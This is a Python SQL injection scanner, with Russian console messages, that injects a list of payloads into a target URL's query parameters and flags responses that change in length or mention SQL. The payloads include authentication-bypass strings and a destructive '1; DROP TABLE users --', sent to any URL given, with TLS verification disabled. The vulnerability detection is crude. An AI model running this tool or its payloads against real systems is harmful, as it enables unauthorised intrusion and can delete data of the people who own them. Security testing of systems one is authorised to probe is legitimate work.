#!/usr/bin/env python3
import requests
import time
from tool_base import ToolBase

class SQLTester(ToolBase):
    def run(self, target):
        results = {
            'target': target,
            'vulnerable': False,
            'payloads_tested': 0,
            'working_payloads': [],
            'error_pages': [],
            'recommendations': []
        }
        
        print(f"🔍 Тестирование SQL инъекций для: {target}")
        print("=" * 40)
        
        payloads = [
            "'",
            "''",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR 1=1 --",
            "' OR 1=1 #",
            "admin' --",
            "1' OR '1'='1",
            "1' OR '1'='1' --",
            "1' OR '1'='1' /*",
            "' UNION SELECT NULL --",
            "') OR ('1'='1",
            "' OR 'a'='a",
            "' OR 1=1",
            "1; DROP TABLE users --"
        ]
        
        try:
            original_response = requests.get(target, timeout=10, verify=False)
            original_length = len(original_response.content)
            
            print(f"📊 Исходная страница: {original_length} байт")
            
            for payload in payloads:
                results['payloads_tested'] += 1
                
                test_url = self.inject_payload(target, payload)
                
                try:
                    response = requests.get(test_url, timeout=10, verify=False)
                    
                    if len(response.content) != original_length:
                        print(f"⚠️  Измененный ответ: {payload}")
                        results['working_payloads'].append(payload)
                        
                        if "sql" in response.text.lower() or "mysql" in response.text.lower():
                            print(f"🚨 ВОЗМОЖНА SQL ИНЪЕКЦИЯ: {payload}")
                            results['vulnerable'] = True
                    
                    time.sleep(0.2)
                    
                except requests.exceptions.RequestException:
                    continue
            
            if results['vulnerable']:
                print(f"\n❌ ВЕБ-САЙТ УЯЗВИМ К SQL ИНЪЕКЦИЯМ!")
                print(f"💡 Обнаружено работающих payloads: {len(results['working_payloads'])}")
                results['recommendations'].append("СРОЧНО исправить уязвимость")
                results['recommendations'].append("Использовать prepared statements")
            else:
                if results['working_payloads']:
                    print(f"\n⚠️  АНОМАЛИИ ОБНАРУЖЕНЫ: {len(results['working_payloads'])} payloads")
                    print(f"💡 Проверьте вручную")
                    results['recommendations'].append("Провести ручное тестирование")
                else:
                    print(f"\n✅ SQL инъекции не обнаружены")
                    results['recommendations'].append("Продолжайте регулярное тестирование")
        
        except Exception as e:
            print(f"❌ Ошибка тестирования: {e}")
            results['error'] = str(e)
        
        print(f"\n🔧 РЕКОМЕНДАЦИИ:")
        for rec in results['recommendations']:
            print(f"  • {rec}")
        
        return results
    
    def inject_payload(self, url, payload):
        if '?' in url:
            base_url, query = url.split('?', 1)
            params = query.split('&')
            
            injected_params = []
            for param in params:
                if '=' in param:
                    key, value = param.split('=', 1)
                    injected_params.append(f"{key}={value}{payload}")
                else:
                    injected_params.append(param)
            
            return f"{base_url}?{'&'.join(injected_params)}"
        else:
            return f"{url}?id={payload}"

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Использование: python sql_tester.py <url>")
        sys.exit(1)
    
    tester = SQLTester()
    tester.run(sys.argv[1])
